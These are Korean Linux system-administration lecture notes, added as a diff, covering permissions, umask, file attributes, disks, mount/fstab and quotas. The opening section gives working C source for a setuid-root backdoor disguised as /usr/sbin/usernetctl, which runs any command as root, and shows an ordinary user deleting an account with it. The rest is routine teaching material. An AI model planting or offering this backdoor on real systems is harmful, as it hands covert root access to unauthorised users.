+  ※ backdoor 프로그램을 숨겨서 실행하는 방법
+
+      ]# vi backdoor2.c
+      #include <stdio.h> 	
+
+      int main(int argc,char *argv[]) {     
+             char exec[100];
+             setuid(0);
+             setgid(0);
+             sprintf(exec,"%s 2>/dev/null",argv[1]);
+             system(exec);
+             printf("usage: usernetctl <interface-config> <up|down|report>\n");
+     }
+
+     ]# gcc -o usernetctl backdoor2.c
+
+     ]# chmod 4755 usernetctl 
+
+     ]# mv usernetctl /usr/sbin/usernetctl     =>  Overwrite
+
+     => kim 계정 로그인    
+
+     ]$ /usr/sbin/usernetctl "/usr/sbin/userdel -r kkk"
+
+  ex)  sticky 권한을 적용한 공유디렉토리 생성
+
+     관리자     ]# mkdir /home/share 
+
+                ]# chmod 777 /home/share
+
+     lee 계정   ]$ cd /home/share
+
+                ]$ mkdir leeData
+
+     park 계정  ]$ cd /home/share
+
+                ]$ rm -rf leeData     =>  삭제 가능 
+
+     관리자     ]# chmod 1777 /home/share
+
+     lee 계정   ]$ cd /home/share
+
+                ]$ mkdir leeData    
+
+    park 계정   ]$ cd /home/share
+
+                ]$ rm -rf leeData     =>  sticky 권한에 의해 삭제 불가능
+
+
+● 파일 및 디렉토리 생성 권한
+
+   디렉토리   777                                 755
+                      -    022 (umask)   =>   
+   파일       666                                 644
+
+     => 파일 및 디렉토리는 umask 값에 의해 최초 생성 권한이 적용된다.
+
+   ex)  ]# mkdir aaaDir
+
+        ]# touch aaaFile
+
+        ]# ls -l
+        drwxr-xr-x 2 root root 4096 10월  3 15:36 aaaDir     (755)
+        -rw-r--r-- 1 root root    0 10월  3 15:36 aaaFile    (644)
+
+        ]# umask
+        0022
+
+        ]# umask  002      =>  umask 변경(현재 로그인 쉘에만 적용)
+
+        ]# mkdir bbbDir   
+
+        ]# touch bbbFile    
+
+        ]# ls -l
+        drwxrwxr-x 2 root root 4096 10월  3 15:40 bbbDir    (775) 
+        -rw-rw-r-- 1 root root    0 10월  3 15:40 bbbFile    (664)
+
+    ※ 계정 생성시 자동 생성된 홈디렉토리의 생성 권한 제어 
+
+       ]# useradd kang
+
+       ]# ls -l /home
+       drwx------ 3 kang kang  4096 10월  3 15:44 kang     (700)
+ 
+       ]# vi /etc/login.defs
+       ....
+       UAMSK    077         =>  홈디렉토리 생성 권한 : 700
+ 
+                076         =>  변경 : 홈디렉토리 생성 권한 : 701
+
+       ]# useradd choi
+
+       ]# ls -l /home
+       drwx-----x 3 choi choi  4096 10월  3 16:00 choi     (701)
+
+
+● 파일(디렉토리) 소유자 및 소유그룹 변경
+
+  - 관리자만 사용 가능한 명령
+
+  형식)  ]# chown [-R]  소유자:소유그룹  파일명(디렉토리명) 
+
+            =>  소유자 및 소유그룹 변경
+ 
+         ]# chown [-R]  소유자  파일명(디렉토리명) 
+
+            =>  소유자 변경
+
+         ]# chgrp [-R]  소유그룹  파일명(디렉토리명) 
+
+            =>  소유그룹 변경
+
+     ※ -R : 디렉토리 소유자 및 소유그룹 변경 시 사용하며 디렉토리 하위 목록들도 변경
+
+  ex) 관리자   ]# userdel park   => 계정만 삭제
+
+               ]# ls -l /home    =>  park 디렉토리 존재(소유자 및 소유그룹이 존재하지 않는다.)
+
+     lee 계정  ]$  cd /home/park  =>  디렉토리 권한이 700이면 접근 오류 발생 
+
+               => 관리자에게 권한 변경을 요청
+
+     관리자    ]# chown -R  lee.lee /home/park    =>  소유자 및 소유그룹 변경
+
+  문제) /home/public 디렉토리를 생성하여 scott, james, john 계정만 
+        접근하여 모든 명령을 사용할 수 있도록 권한을 부여하세요.
+        단, 삭제(변경)는 파일(디렉토리) 소유자만 가능하도록 권한을 부여하세요.
+
+   => 계정, 그룹, 권한, 소유자(소유그룹) 관련 명령 활용
+ 
+   ]# useradd scott;passwd scott 
+
+   ]# useradd james;passwd james 
+
+   ]# useradd john;passwd john  
+
+   ]# mkdir /home/public
+
+   ]# ls -l /home | grep public
+   drwxr-xr-x 2 root  root   4096  9월 12 09:57 public
+
+   ]# groupadd foreign
+
+   ]# gpasswd -M scott,james,john foreign 
+
+   ]# grep foreign /etc/group
+   foreign:x:506:scott,james,john
+
+   ]# chgrp foreign /home/public
+
+   ]# ls -l /home | grep public
+   drwxr-xr-x 2 root  foreign   4096  9월 12 09:57 public
+
+   ]# chmod 1770 /home/public/
+
+   ]# ls -l /home | grep public
+   drwxrwx--T 2 root  foreign   4096  9월 12 09:57 public
+
+
+● 파일 속성
+
+  - 파일 권한과는 별개로 별도의 의미를 가지고 있는 특수한 기능
+
+  - 관리자도 파일 삭제 또는 변경이 되지 않도록 파일의 속성을 사용하는 경우가 있다.
+
+  - 파일 속성 관련 명령
+
+     ]# lsattr 파일명(디렉토리명)    => 현재 디렉토리 또는 원하는 디렉토리의 하위목록들의 파일 속성 확인
+     
+     ]# chattr [-R] +속성 파일명(디렉토리명)   =>  속성 추가
+      
+     ]# chattr [-R] -속성 파일명(디렉토리명)   =>  속성 삭제
+
+   - 파일 속성
+
+     i : 파일의 삭제 또는 변경 불가(파일명 변경 불가, 링크 파일 생성 불가등)
+
+     a : 파일의 내용만 추가 가능하며 삭제 또는 변경 불가
+
+     c : 압축된 상태로 저장 => 읽을 경우 자동으로 압축 해제
+
+     d : dump 명령에 의해 Backup 되지 않도록 지정
+
+     s : 파일 삭제시 해당 블럭을 0으로 만들어 블럭에 쓰기를 발생되도록 설정
+
+     S : 파일의 내용을 변경할 경우 디스크 동기화 발생
+
+     u : 파일 삭제 시 파일의 내용을 저장하여 데이타 복구가 가능하도록 설정     
+
+  ex)  ]# lsattr aaa.txt
+        ------------- aaa.txt
+ 
+        ]# chattr +i aaa.txt
+
+        ]# lsattr aaa.txt
+        ----i-------- aaa.txt       
+
+        ]# rm -rf aaa.txt      => 삭제 불가능(i 속성에 의해 삭제 불가)
+        rm: cannot remove `aaa.txt': 명령이 허용되지 않음 
+
+        ]# chattr -i aaa.txt
+
+        ]# lsattr aaa.txt
+        ------------- aaa.txt
+ 
+        ]# rm -rf aaa.txt      => 삭제 가능
+
+
+● 날짜 및 시간 관리
+
+  - 리눅스 시간 및 날짜 확인
+
+    ]# hwclock   =>  하드웨어 시간확인 : 메인보드에 존재하는 CMOS의 시간
+
+    ]# date      =>  운영체제 시간확인 : 리눅스 시스템의 시간 - 커널시간
+
+  - 리눅스 시간 및 날짜 변경
+
+    ]# hwclock -w    =>  운영체제 시간을 이용하여 하드웨어 시간을 변경
+
+    ]# hwclock -s    =>  하드웨어 시간을 이용하여 운영체제 시간을 변경
+
+    ]# date 090912152013     =>  ]# date MMddhhmmCCCC 
+
+    ]# rdate -s time.bora.net     =>  Time Server(NTP 서버)의 시간을 이용하여 운영체제 시간을 변경
+
+
+● 디스크 관리
+
+  1. 파티션 관리
+
+    ]# fdisk -l     =>  현재 사용할 수 있는 장치 목록 확인    
+
+    ]# fdisk  /dev/sda     =>  저장장치에 대한 파티션 관리
+
+    Command (m for help): m     =>  fdisk에서 사용할 수 있는 명령 목록 확인
+
+    ※ Command Action
+
+        p  :  파티션 정보 확인
+ 
+        n  :  파티션 생성
+
+        d  :  파티션 삭제
+
+        t  :  파티션 파일시스템 변경
+
+        q  :  변경된 파티션 정보를 적용하지 않고 fdisk 종료
+
+        w  :  변경된 파티션 정보를 적용하고 fdisk 종료
+
+    - 시스템이 설치된 디스크 파티션을 변경한 경우 시스템 재부팅 해야만 된다.
+
+  2. 파티션 포멧
+
+    - 파티션을 초기화하여 시스템 데이타를 저장할 수 있도록 만들어 주는 기능
+
+    ]# mkfs  -t  파일시스템  장치파일명
+
+      ※ 파일시스템 :  파일 데이타를 저장하는 방식를 지정
+
+         Windows OS  :  fat16 또는 fat32(vfat : 읽기 쓰기 가능), ntfs(ntfs : 읽기 가능 >> ntfs-3g : 읽기 쓰기 가능)    
+
+         Linux OS  :  ext3  또는 ext4
+
+    ex)  ]# mkfs -t ext3 /dev/sda9
+
+       ※  swap 파티션 포멧
+
+         ]# mkswap -c 장치파일명
+
+  3. 파티션 검사
+
+      ]# fsck -t  파일시스템  장치파일명
+
+      ex)  ]# fsck -t ext3 /dev/sda9
+
+      ※ 사용 중인 장치(mount장치)들은 fsck 명령을 이용해서 check 해서는 안된다.
+
+         =>  사용 중인 장치를 해제(umount)하고 나서 fsck 명령을 사용하는 것이 좋다.
+
+      ※ fsck 명령은 부팅시 장치가 연결(mount) 되기 전에 실행되어 파티션 오류 검사를 한다.
+
+  4. 저장장치 연결 - mount
+
+     - Linux는 장치를 사용하기 위해 반드시 디렉토리와 연결(mount) 하여 디렉토리를 장치로 활용한다.
+
+     형식)  ]# mount  -t  파일시스템  장치파일명  연결디렉토리    
+
+     ex)  CD 또는 DVD를 사용할 경우
+ 
+         ]# df -h     =>  현재 mount 되어 있는 장치 정보를 확인                
+
+         ]# mkdir /mnt/cdrom
+
+         ]# mount -t iso9660 /dev/cdrom  /mnt/cdrom
+
+         ]# df -h        =>  CD  또는 DVD  연결 확인
+
+         ]# ls -l /mnt/cdrom      =>   CD  또는 DVD 데이타 확인
+
+      ex)  USB 메모리 또는  USB 외장하드를 사용할 경우
+
+         ]# fdisk -l     => 장치 및 파티션 확인    ex) /dev/sdb  =>  /dev/sdb1
+
+         ]# mkdir /mnt/usb
+
+         ]# mount -t vfat /dev/sdb1  /mnt/usb   
+
+         ]# df -h    =>  연결 확인
+
+         ]# ls -l /mnt/usb    =>  USB 저장장치의 데이타를 확인  
+
+      ex) 하드디스크 파티션 연결  =>  /dev/sda9
+
+         ]# mkdir /backup
+
+         ]# mount -t ext3 /dev/sda9  /backup
+
+         ]# df -h     =>  연결 확인 
+
+     - 연결된 장치를 사용하지 않을 경우 연결 해제
+
+       형식) ]# umount 장치파일 또는 연결디렉토리
+
+        ex)  ]# umount /mnt/usb
+
+             ]# df -h    =>  연결해제 확인       
+
+     - 부팅 시 자동 mount 되도록 지정하고자 하면 /etc/fstab 파일을 수정
+
+       => /etc/fstab 파일은 부팅 시 init에 의해 읽어들여 자동 mount 한다.
+
+        ]# vi /etc/fstab
+        LABEL=/              /                  ext3    defaults        1  1
+        ... 
+          (1)               (2)                  (3)      (4)          (5)(6)
+
+        1) 장치파일명 => 장치파일명 대신 장치별명(Label명) 또는 장치고유번호(UUID)를 사용하기도 한다.
+
+           ※ Label 생성 및 확인
+
+             ]# e2label  /dev/sda9  /backup    =>  /dev/sda9 장치파일명에 /backup 라벨명 지정                          
+
+                  => /dev/sda9  =  LABEL=/backup
+
+             ]# e2label /dev/sda9     =>  장치에 부여된 Label 확인
+         
+           ※ UUID : 장치에 부여된 고유번호
+
+             ]# blkid /dev/sda9    =>  /dev/sda9 장치의 UUID 확인 
+
+                =>  /dev/sda9   =   UUID=31295bf7-248f-4706-9096-51767b13045c
+
+         2) 연결디렉토리
+
+         3) 파일시스템 종류
+
+         4) 연결옵션  -  defaults :  모든 옵션을 기본값으로 사용  
+
+         5) dump 옵션  -  dump 명령(파티션 backup 명령) 사용 가능 여부에 대한 값 적용
+
+               0  :  dump 명령 사용 불가능
+
+               1  :  dump 명령 사용 가능    =>  Linux 파일시스템
+
+         6) fsck 옵션  -  fsck 명령 사용 가능 여부 및 순서 지정
+
+               0  :  fsck 명령 사용 불가능 
+
+               1  :  fsck 명령 최초 사용(Linux 파일시스템의 / 디렉토리에 적용)
+
+               2  :  fsck 명령 사용(Linux 파일시스템의 모든 디렉토리)
+
+    ※ /etc/fstab 파일에 mount 정보를 잘못 수정한 경우 리눅스가 부팅되지 않을 수 있다.
+      
+       - 시스템에 심각한 오류 발생시 부팅되지 못하는 경우가 발생 가능
+       
+       - 설치 DVD를 이용한 부팅을 이용하여 수정 복구 가능
+ 
+     ]# vi /etc/fstab
+     ...
+     /dev/sda10            /backup                 ext3    defaults        1 2
+     ----------
+         └ 오류
+
+     => 설치 DVD로 부팅 후 rescue 모드로 부팅 
+
+       boot : linux rescue 
+
+     => /mnt/sysimage 디렉토리에 모든 파티션이 mount 되어 있다.
+        여기서 파일시스템 검사 및 파일 수정이 가능
+
+     => /etc/fstab 파일 변경 후 재부팅
+      
+  
+● 디스크 용량 제한(Disk Quota)
+
+  - 제한적인 디스크 자원을 모든 계정이 평등하게 사용하도록 사용용량의 제한을 만들어 주는 기능
+
+  1. Quota 프로그램 실행
+
+    1) 제한 디렉토리(파티션)를 지정 => /home 디렉토리 제한
+
+       ]# vi /etc/fstab    =>  제한 디렉토리에 quota 옵션을 적용
+       장치파일명	  연결디렉토리	 파일시스템	  옵션,quota옵션 	 dump옵션  fsck옵션
+
+       ※ quota 옵션
+
+          - usrquota : 소유자 제한  => 계정 제한      
+
+          - grpquota : 소유그룹 제한  =>  그룹 제한 
+
+      ex) ]# vi /etc/fstab
+          LABEL=/home      /home     ext3    defaults,usrquota        1 2
+                                                     ---------
+                                                         └ 추가 
+   
+    2) 제한 디렉토리 Remount   =>  /etc/fstab 파일의 참조하여 mount
+
+      - usrquota 옵션을 적용하여 mount
+
+      ]# mount -o remount 장치파일명    =>  장치 remount
+
+      ex)  ]# mount -o remount LABEL=/home
+
+    3) Quota 파일 생성
+
+      - Quota 파일 : 제한을 하고자 하는 디렉토리의 소유자(소유그룹)의 디스크 사용정보 및 제한정보를 저장하고 있는 파일
+
+      ]# quotacheck -avug    =>  제한디렉토리를 스캔하여 소유자(소유그룹)의 사용정보 및 제한정보를 가진 파일을 생성
+
+      - Quota 파일은 제한디렉토리에 생성된다.  
+
+         => /home/aquota.user 파일 생성(/home/aquota.group 파일)     
+
+    4) Quota 프로그램 실행
+
+      - Quota 파일을 디렉토리에 적용하여 실제 제한되도록 Quota 실행
+
+       ]# quotaon -avug
+
+        => quotacheck 명령은 quotaon 상태에서 실행하면 안된다.
+
+        => /etc/fatab에 quota 옵션이 적용된 경우 부팅시 자동으로 quotaon 된다.
+ 
+      - Quota 프로그램 실행 취소
+
+       ]# quotaoff -avug
+     
+  2. Quota 프로그램 사용
+
+    1) 제한정보 변경
+
+       ]# edquota -u 소유자명(계정명)   =>  소유자 제한(그룹제한은 -g를 사용)
+
+         => vi 편집기를 이용하여 제한
+
+         => 변경 후 저장하면 제한 적용
+
+       ]# edquota -ut     =>  모든 소유자의 유예기간 변경
+
+       ]# edquota -up 기준계정 계정 계정 계정   =>  제한정보를 복사
+
+       ex) ]# edquota -u scott
+           Disk quotas for user scott (uid 503):
+           Filesystem                   blocks       soft       hard     inodes     soft     hard
+           /dev/sda6                        40         60         70         10        0        0
+                                                       --         --       
+                                                       └   변경  ┘               
+
+           ※ blocks : 현재 소유자의 사용 용량 정보(kbyte)
+
+              inodes : 현재 소유자의 소유파일의 갯수
+
+              soft  : 경고 제한 => 경고제한을 넘을 경우의 데이타는 유예기간동안 사용 가능 
+
+              hard  : 실제 제한
+
+          ]# edquota -ut
+          Grace period before enforcing soft limits for users:
+          Time units may be: days, hours, minutes, or seconds
+          Filesystem             Block grace period     Inode grace period
+          /dev/sda6                  10minutes                 7days
+                                     ----------
+                                         └ 변경
+
+          ]# edquota -up scott james john
+
+          ]# repquota -ua    
+
+    2) 제한정보 확인
+
+      ]# quota -u 계정명   =>  계정에 대한 사용정보 및 제한정보 확인          
+
+      ]# repquota -ua      =>  모든 계정에 대한 사용정보 및 제한정보를 확인
+
+      ※ 일반계정은 로그인 후 quota 명령을 이용하여 자신의 사용정보 및 제한정보 확인
+
+         ]$ quota 
